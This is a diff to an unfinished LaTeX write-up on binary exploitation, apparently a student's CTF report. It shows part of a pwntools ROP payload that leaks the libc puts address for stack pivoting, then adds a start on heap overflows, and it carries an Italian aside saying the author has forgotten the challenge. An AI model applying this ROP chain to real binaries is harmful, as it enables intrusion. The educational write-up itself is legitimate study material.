@@ -365,10 +365,8 @@ To understand the mitigations the pwntools library help us, in fact there is a f
     \begin{verbatim}
                 
         pop_rdi=0x4012fb
-        system=0x52290  
         puts1=0x84420      
         payload2=flat(
-    
              p64(pop_rdi),#address of pop rdi
              p64(exe.got.puts),#address of got puts fucnion
              p64(exe.sym.puts),#address that will actualy print the got puts addres
@@ -379,13 +377,22 @@ To understand the mitigations the pwntools library help us, in fact there is a f
              p64(target_bp), #send the target base pointe    
         )
         io.sendafter(b">", payload2)
-        
     \end{verbatim}
+        
+    Here is the exploit as we can see at the beginning I saved the addresses of pop rdi which is very useful because it allows us to populate the contents of the syscall, then the address of puts without base and then calculate it later.\newline
+    Subsequently I will write the rop that will allow me to do stack pivoting and leak the puts address to calculate the base of the libc.\newline
+
+    DEVO RI EXPLOITARE LA CHALLENGE NON RICORDO DELLE COSE LOL
+
     \clearpage
     %capitolo heap overflow 
     \chapter{Heap Overflow Vulnerability}
+    \section{Malloc internal}
+    The next bug that I will show, as can be understood from the name, concerns another section of memory such as the heap which functions differently than the stack.\newline
+    The heap known as Dynamic memory is a memory that is used for dynamic allocation, this is useful because you don't need to care about the size and the life time of the object. \newline
+    Furthermore the heap in languages as C is manipulated from the user through functions as malloc() calloc() that permit you to create heap memory section usually called chunk, and free() to free your memory.\newline
+     
     \section{How it works a Heap Overflow}
-    to be continued
     \clearpage
     \section{overview challenge and attack planning}
     to be continued
